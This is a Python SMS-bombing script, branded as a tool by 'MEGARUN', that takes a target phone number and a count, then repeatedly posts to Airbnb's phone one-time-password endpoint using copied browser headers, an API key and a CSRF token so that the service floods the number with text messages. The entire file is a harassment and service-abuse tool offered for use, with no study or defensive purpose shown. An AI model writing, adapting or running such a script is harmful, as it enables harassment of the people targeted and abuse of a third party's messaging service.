import requests
import os
import sys
import time
import json

os.system('clear')

bar = "\033[1;33;40m\n_________________________________________________\n"
name = ""



print("\033[0;36m "" ///////       ////    ////   ////////               ////////////   //////////  //////////  //")
print("\033[0;36m "" //           // //  // //    //                          //        //      //  //      //  //")                                                 
print("\033[0;36m "" //          //   //   //     //                          //        //      //  //      //  //")
print("\033[0;36m "" ///////    //        //      ////////                    //        //      //  //      //  //")                                                              
print("\033[0;36m ""      //   //        //             //                    //        //      //  //      //  //")                                                           
print("\033[0;36m ""      //  //        //              //                    //        //      //  //      //  //")                                                                     
print("\033[0;36m "" /////// //        //         ////////                    //        //////////  //////////  //////////")
print("\033[0;35m ""                                          [TOOL BY MEGARUN] ")
print("")
print("\033[1;33m ""#YOU CAN SEND 10 MESSAGE ONLY ONE NUMBER")
print("\033[0;32m ""#OUT PUT = 200  message was sent successfully")
print("\033[1;31m ""#OUT PUT = 400  LIMITED ")
print("")
print("")

number = int(input("\033[1;37m""@ Enter phone number with international format (94xxxxxxxxx) - "))


def main():
    os.system("clear")
    print("\n\n") 
    s = int(input("\033[1;0;40mEnter Amount - "))



    url = "https://www.airbnb.com/api/v2/phone_one_time_passwords?currency=USD&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=en"
    

    headers = {
    "accept": "application/json, text/javascript, */*; q=0.01",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-US,en;q=0.9,si;q=0.8",
    "cache-control": "no-cache",
    "content-length":"81",
    "content-type":  "application/json",
    "device-memory": "4",
    "dpr": "1",
    "ect": "4g",
    "origin": "https://www.airbnb.com",
    "referer": "https://www.airbnb.com/",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36",
    "viewport-width": "811",
    "x-csrf-token": "V4$.airbnb.com$2b6lgizn2c8$_YXxw_npUQGCUwtRNBIIGBa7dhCZoLqPs7ewu6tF-YU=",
    "x-csrf-without-token": "1",
    "x-requested-with": "XMLHttpRequest",

    }    

    params = {
    "currency": "USD",
    "key": "d306zoyjsyarp7ifhu67rjxn52tv0t20",
    "locale": "en",
    
    }    
    payload = {
    "otpMethod": "AUTO",
    "phoneNumber": number,
    "workFlow": "GLOBAL_SIGNUP_LOGIN",
    }

    ss = 0
    while s > ss:
        os.system("clear")
        print(name)
        size = 0
        r = requests.post(url, data=json.dumps(payload), headers=headers)
        resp = str(r)
        if resp == '<Response [200]>':
            print("200 success")
        elif resp == '<Response [400]>':
            print("400  limited")
        else:
            print("\033[1;31m ""something wrong please try again")

        ss+=1
        print("\033[1;0;40m\n",str(ss), end="")
        for i in range(180):
            
            pr = i/180*100
            print("\033[1;36;40m\n>>>",str(int(pr)) +"% ",end="")
            
            time.sleep(0.002)
            sys.stdout.write("\033[F")


    os.system('')
    again()


def again():
    again = input(' (y/n) - ')
    if again == "y" or again == "Y":
        os.execl(sys.executable, sys.executable, * sys.argv)
    elif again == "n" or again == "N":
        quit()
    else:
        print('\033[1;31;40mEnter valid letter')
        again()


if __name__ == "__main__":
    main()
